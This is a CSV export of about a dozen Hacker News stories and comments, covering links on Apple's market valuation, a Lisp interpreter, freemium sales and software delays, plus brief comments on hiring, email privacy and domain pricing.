ID,Type,Story,Parent,Points,Comments,Author,Title,URL,Content,Created
5181789,story,,,1,0,j-g-faustus,"Inefficient markets: Understanding Apple",http://www.institutionalinvestor.com/blogarticle/3151025/Blog/Understanding-Apple-Requires-an-Analysis-of-Fundamentals-and-Psychology.html,,1360241991
5181788,comment,5181218,5181578,3,0,nwh,,,"Have a look at some of the websites you visit daily. A lot won't be using any type of protection. Most forums don't, for example.",1360241976
5181787,comment,5178653,5180525,3,0,mattdeboard,,,"We have a university here locally that is a join venture between two other major universities in the state, including sharing professors, curriculum and resources. It draws many, many working adults (as well as traditional students). There are many such students who work and attend school full time to get their degree and have not had time to do a bunch of side projects. Life gets in the way sometimes. Plus, you don't need someone whose whole life/only hobby is programming. My standards don't include ""must spend free time practicing their trade"".<p>If one has open-source projects, great. If not that doesn't even come close to excluding them.",1360241939
5181786,story,,,2,0,S4M,"Lisp interpreter written in ActionScript",http://www.solve-et-coagula.com/?p=8,,1360241938
5181785,story,,,1,0,ttunguz,"Freemium Businesses Switch the Hunter and Farmer Sales Roles",http://tomtunguz.com/freemium-businesses-switch-the-hunter-and-farmer-sales-roles,,1360241916
5181784,comment,5181364,5181507,4,0,Skoofoo,,,"Agreed. It's annoying how Microsoft misleads the reader into thinking that they personally look through every email.",1360241900
5181783,story,,,3,0,dmytton,"What causes delays in software projects",http://blog.serverdensity.com/what-causes-delays-in-software-projects/,,1360241886
5181782,comment,5181698,5181734,1,0,pixeledanny,,,"Well any idea where I get some beta testers from the EPFL ?",1360241866
5181781,comment,5181284,5181314,2,0,delinka,,,"Or maybe he's not interested in selling. But to make him interested in selling, he's got a number that might get his interest. It's a supply and demand thing. He's not supplying, but if you demand at a high enough price, he just might. Maybe. Because he likes his domain.",1360241858
5181780,comment,5181213,5181490,2,0,twitchhiker,,,"Help to help you out with contacts - I'm the guy from ignite100 in the feature. Also, if you'd like to work with any of the ignite100 alumni, more than happy to connect you.<p>P",1360241856
5181779,comment,5181284,5181284,3,0,JacobAldridge,,,"Why not $10 million. As I just said in relation to the Wired / McDonalds post, I wish I'd had the foresight to do this.<p>And if I had, you can bet I'd be milking it for everything I could.",1360241812
